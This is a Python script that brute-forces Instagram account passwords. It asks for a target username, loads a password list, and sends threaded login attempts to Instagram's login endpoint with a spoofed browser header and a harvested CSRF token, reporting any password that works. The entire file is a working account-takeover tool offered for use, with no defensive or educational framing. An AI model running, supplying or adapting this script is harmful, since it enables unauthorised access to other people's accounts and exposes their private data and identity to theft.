import requests
import time
import sys
from datetime import datetime
from colorama import init, Fore, Style
import concurrent.futures

# Initialize colorama
init(autoreset=True)

# Instagram login function
def instagram_login(username, password, session):
    login_url = 'https://www.instagram.com/accounts/login/ajax/'

    # Use the current timestamp for enc_password
    timestamp = int(datetime.now().timestamp())

    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    # Get the CSRF token dynamically from the session's cookies
    try:
        response = session.get("https://www.instagram.com/")
        csrf_token = session.cookies.get('csrftoken')

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "x-csrftoken": csrf_token
        }

        # Send POST request for login
        login_response = session.post(login_url, data=payload, headers=headers)
        login_response.raise_for_status()  # Raise an error for bad responses

        response_data = login_response.json()
        
        # Check for successful login
        if response_data.get('authenticated', False):
            return True
        else:
            return False

    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Request error: {e}")
        return False
    except KeyError:
        print(Fore.RED + "[-] Failed to retrieve CSRF token")
        return False
    except Exception as e:
        print(Fore.RED + f"[-] Unexpected error: {e}")
        return False

# Main function to handle the bruteforce attack
def main():
    username = input("Enter Instagram username to bruteforce: ")
    password_file = "passwords.txt"

    try:
        with open(password_file, "r") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + f"[-] Error: {password_file} not found.")
        sys.exit(1)

    print(Fore.GREEN + f"[*] Starting bruteforce attack on {username}")
    print(Fore.GREEN + f"[*] Loaded {len(passwords)} passwords from {password_file}")

    # Create a session that will persist across multiple requests
    session = requests.Session()

    # Define a function to attempt login for a given password
    def try_password(password):
        print(Fore.YELLOW + f"[+] Trying: {password}", end=" | ", flush=True)

        # Attempt login with the current password
        if instagram_login(username, password, session):
            print(Fore.GREEN + f"[+] Login successful for {username}:{password}")
            return True
        else:
            print(Fore.RED + "Status = [Fail]")
            return False

    # Use threading to try multiple passwords in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        # Map the try_password function to all passwords and submit them concurrently
        results = {executor.submit(try_password, password): password for password in passwords}

        # Wait for the first successful login
        for future in concurrent.futures.as_completed(results):
            if future.result():
                print(Fore.GREEN + "[*] Bruteforce attack completed.")
                break

    print(Fore.GREEN + "[*] Attack finished or interrupted.")

if __name__ == "__main__":
    main()
        
